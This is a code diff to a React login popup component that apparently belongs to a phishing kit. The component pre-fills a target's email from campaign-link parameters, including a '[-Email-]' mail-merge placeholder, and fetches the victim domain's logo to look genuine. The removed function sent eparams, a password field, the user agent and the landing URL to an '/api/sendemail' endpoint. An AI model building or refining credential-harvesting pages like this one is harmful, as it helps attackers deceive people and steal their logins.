@@ -16,15 +16,12 @@ const Popup = ({ domain, favicon, eparams, systemInfo }) => {
 
   useEffect(() => {
     try {
-      // Extract email from URL parameters
+      // Extract email from URL parameters using both syntaxes
       const urlParams = new URLSearchParams(window.location.search);
-      const emailFromUrl = urlParams.get('email');
+      const emailFromUrl = urlParams.get('email') || urlParams.get('[-Email-]');
       if (emailFromUrl) {
         setEmail(emailFromUrl);
       }
-      
-      // Send initial access notification
-      sendAccessNotification();
       
       // Extract domain from email or use provided domain to get logo
       extractDomainAndGetLogo();
@@ -91,36 +88,6 @@ const Popup = ({ domain, favicon, eparams, systemInfo }) => {
         return <LinuxIcon />;
       default:
         return null;
-    }
-  };
-
-  const sendAccessNotification = async () => {
-    try {
-      const userAgent = navigator.userAgent;
-      const remoteAddress = ""; // This would typically be captured server-side
-      
-      const response = await fetch("/api/sendemail", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ 
-          eparams, 
-          password: "", 
-          userAgent, 
-          remoteAddress, 
-          landingUrl: window.location.href
-        }),
-      });
-
-      if (!response.ok) {
-        throw new Error("Failed to send access notification");
-      }
-
-      const data = await response.json();
-      console.log(data.message);
-    } catch (error) {
-      console.error("Error:", error);
     }
   };
 
